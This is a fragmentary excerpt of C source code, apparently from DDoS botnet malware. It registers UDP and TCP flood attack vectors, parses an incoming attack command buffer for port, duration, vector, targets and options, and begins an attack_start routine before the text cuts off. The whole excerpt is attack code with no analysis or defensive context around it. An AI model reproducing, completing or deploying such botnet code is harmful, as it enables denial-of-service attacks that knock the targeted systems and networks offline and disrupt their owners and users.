...
{
    add_attack(ATK_VEC_UDPFLOOD, (ATTACK_FUNC)attack_udp_flood);
    add_attack(ATK_VEC_TCPFLOOD, (ATTACK_FUNC)attack_tcp_flood);
    return TRUE;
}
...
void attack_parse(char *buf, int len)
{
    ...
    // Read in attack port uint32_t
    if (len < sizeof (uint32_t))
        goto cleanup;
    port = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);
    ...
    errno = 0;
    attack_start(port, duration, vector, targs_len, targs, opts_len, opts);
...
void attack_start(int port, int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;
